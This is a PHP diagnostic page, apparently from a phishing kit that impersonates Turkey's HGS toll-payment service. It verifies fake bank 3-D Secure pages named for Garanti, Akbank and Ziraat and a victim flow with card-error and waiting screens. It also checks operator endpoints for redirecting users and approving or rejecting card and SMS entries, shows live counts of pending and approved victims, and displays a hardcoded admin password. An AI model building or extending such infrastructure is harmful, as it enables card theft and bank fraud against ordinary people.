<?php
/**
 * System Verification Test
 * Tests all critical components of the HGS system
 */

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Test - HGS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 2rem;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: white;
            text-align: center;
            margin-bottom: 2rem;
            font-size: 2.5rem;
        }
        .test-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        .test-card {
            background: white;
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .test-card h2 {
            color: #667eea;
            margin-bottom: 1rem;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .status {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-left: auto;
        }
        .status.success { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
        .status.pending { background: #fff3cd; color: #856404; }
        .test-result {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
            font-size: 0.9rem;
            line-height: 1.6;
        }
        .test-result pre {
            background: #e9ecef;
            padding: 0.5rem;
            border-radius: 4px;
            overflow-x: auto;
            margin-top: 0.5rem;
        }
        .btn {
            display: inline-block;
            padding: 12px 24px;
            background: #667eea;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
            margin: 0.5rem;
        }
        .btn:hover {
            background: #5568d3;
            transform: translateY(-2px);
        }
        .actions {
            text-align: center;
            margin-top: 2rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 HGS System Verification</h1>
        
        <div class="test-grid">
            <!-- Database Connection Test -->
            <div class="test-card">
                <h2>
                    Database Connection
                    <?php
                    require_once 'config.php';
                    try {
                        $pdo = getDbConnection();
                        echo '<span class="status success">✓ OK</span>';
                        $dbConnected = true;
                    } catch(Exception $e) {
                        echo '<span class="status error">✗ FAIL</span>';
                        $dbConnected = false;
                    }
                    ?>
                </h2>
                <div class="test-result">
                    <?php if ($dbConnected): ?>
                        <strong>Connected to:</strong> hgs_system<br>
                        <strong>Charset:</strong> utf8mb4<br>
                        <strong>Status:</strong> Active
                    <?php else: ?>
                        <strong>Error:</strong> <?= htmlspecialchars($e->getMessage()) ?>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Tables Check -->
            <div class="test-card">
                <h2>
                    Database Tables
                    <?php
                    $tablesOk = false;
                    if ($dbConnected) {
                        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
                        $required = ['users', 'online_users', 'bins'];
                        $missing = array_diff($required, $tables);
                        $tablesOk = empty($missing);
                        echo $tablesOk ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    } else {
                        echo '<span class="status error">✗ SKIP</span>';
                    }
                    ?>
                </h2>
                <div class="test-result">
                    <?php if ($dbConnected): ?>
                        <strong>Found Tables:</strong><br>
                        <?php foreach($tables as $table): ?>
                            • <?= $table ?><br>
                        <?php endforeach; ?>
                        <?php if (!empty($missing)): ?>
                            <br><strong style="color: #721c24;">Missing:</strong> <?= implode(', ', $missing) ?>
                        <?php endif; ?>
                    <?php else: ?>
                        Database not connected
                    <?php endif; ?>
                </div>
            </div>

            <!-- Collation Check -->
            <div class="test-card">
                <h2>
                    Collation Status
                    <?php
                    $collationOk = false;
                    if ($dbConnected && $tablesOk) {
                        $cols = $pdo->query("SHOW FULL COLUMNS FROM online_users WHERE Field IN ('session_id', 'user_identifier', 'ip_address', 'current_page')")->fetchAll(PDO::FETCH_ASSOC);
                        $wrongCollation = array_filter($cols, function($col) {
                            return strpos($col['Collation'], 'utf8mb4_unicode_ci') === false;
                        });
                        $collationOk = empty($wrongCollation);
                        echo $collationOk ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    } else {
                        echo '<span class="status error">✗ SKIP</span>';
                    }
                    ?>
                </h2>
                <div class="test-result">
                    <?php if ($dbConnected && $tablesOk): ?>
                        <?php foreach($cols as $col): ?>
                            <strong><?= $col['Field'] ?>:</strong> <?= $col['Collation'] ?? 'N/A' ?><br>
                        <?php endforeach; ?>
                    <?php else: ?>
                        Prerequisites not met
                    <?php endif; ?>
                </div>
            </div>

            <!-- Tracking File Check -->
            <div class="test-card">
                <h2>
                    Tracking System
                    <?php
                    $trackingExists = file_exists('tracking.js') && file_exists('track_online.php');
                    echo $trackingExists ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    ?>
                </h2>
                <div class="test-result">
                    <strong>tracking.js:</strong> <?= file_exists('tracking.js') ? '✓ Found' : '✗ Missing' ?><br>
                    <strong>track_online.php:</strong> <?= file_exists('track_online.php') ? '✓ Found' : '✗ Missing' ?><br>
                    <strong>Heartbeat:</strong> 600ms
                </div>
            </div>

            <!-- API Endpoints Check -->
            <div class="test-card">
                <h2>
                    API Endpoints
                    <?php
                    $apiExists = file_exists('api.php');
                    echo $apiExists ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    ?>
                </h2>
                <div class="test-result">
                    <strong>api.php:</strong> <?= $apiExists ? '✓ Found' : '✗ Missing' ?><br>
                    <strong>Endpoints:</strong><br>
                    • get_online_users<br>
                    • online_count<br>
                    • get_guests<br>
                    • guest_count<br>
                    • get_all_users<br>
                    • send_redirect<br>
                    • approve_payment<br>
                    • reject_sms<br>
                    • reject_card
                </div>
            </div>

            <!-- Admin Panel Check -->
            <div class="test-card">
                <h2>
                    Admin Panel
                    <?php
                    $adminExists = file_exists('admin/index.php') && file_exists('admin/login.php');
                    echo $adminExists ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    ?>
                </h2>
                <div class="test-result">
                    <strong>Location:</strong> /admin/<br>
                    <strong>Login:</strong> <?= file_exists('admin/login.php') ? '✓ Found' : '✗ Missing' ?><br>
                    <strong>Layout:</strong> <?= file_exists('admin/layout.php') ? '✓ Found' : '✗ Missing' ?><br>
                    <strong>Password:</strong> admin123
                </div>
            </div>

            <!-- ACS Pages Check -->
            <div class="test-card">
                <h2>
                    ACS Integration
                    <?php
                    $acsPages = ['acs/garanti.php', 'acs/akbank.php', 'acs/ziraat.php', 'acs/other.php', 'acs/diger.php'];
                    $acsFound = array_filter($acsPages, 'file_exists');
                    $acsOk = count($acsFound) === count($acsPages);
                    echo $acsOk ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    ?>
                </h2>
                <div class="test-result">
                    <?php foreach($acsPages as $page): ?>
                        <strong><?= basename($page) ?>:</strong> <?= file_exists($page) ? '✓' : '✗' ?><br>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- User Flow Check -->
            <div class="test-card">
                <h2>
                    User Flow Pages
                    <?php
                    $flowPages = ['index.php', 'screen2.php', 'screen3.php', 'bekle.php', 'success.php', 'error_card.php'];
                    $flowFound = array_filter($flowPages, 'file_exists');
                    $flowOk = count($flowFound) === count($flowPages);
                    echo $flowOk ? '<span class="status success">✓ OK</span>' : '<span class="status error">✗ FAIL</span>';
                    ?>
                </h2>
                <div class="test-result">
                    <?php foreach($flowPages as $page): ?>
                        <strong><?= $page ?>:</strong> <?= file_exists($page) ? '✓' : '✗' ?><br>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- Live Stats -->
            <?php if ($dbConnected && $tablesOk): ?>
            <div class="test-card">
                <h2>
                    Live Statistics
                    <span class="status success">📊 LIVE</span>
                </h2>
                <div class="test-result">
                    <?php
                    $stats = [
                        'Total Users' => $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn(),
                        'Pending' => $pdo->query("SELECT COUNT(*) FROM users WHERE payment_status = 'pending'")->fetchColumn(),
                        'Approved' => $pdo->query("SELECT COUNT(*) FROM users WHERE payment_status = 'approved'")->fetchColumn(),
                        'Online Users' => $pdo->query("SELECT COUNT(*) FROM online_users WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE) AND user_identifier IS NOT NULL")->fetchColumn(),
                        'Guests' => $pdo->query("SELECT COUNT(*) FROM online_users WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE) AND user_identifier IS NULL")->fetchColumn(),
                    ];
                    foreach($stats as $label => $value):
                    ?>
                        <strong><?= $label ?>:</strong> <?= $value ?><br>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
        </div>

        <div class="actions">
            <a href="/" class="btn">🏠 Ana Sayfa</a>
            <a href="/admin/" class="btn">🔐 Admin Panel</a>
            <a href="/test_tracking.php" class="btn">📡 Test Tracking</a>
            <a href="javascript:location.reload()" class="btn">🔄 Refresh Tests</a>
        </div>
    </div>
</body>
</html>
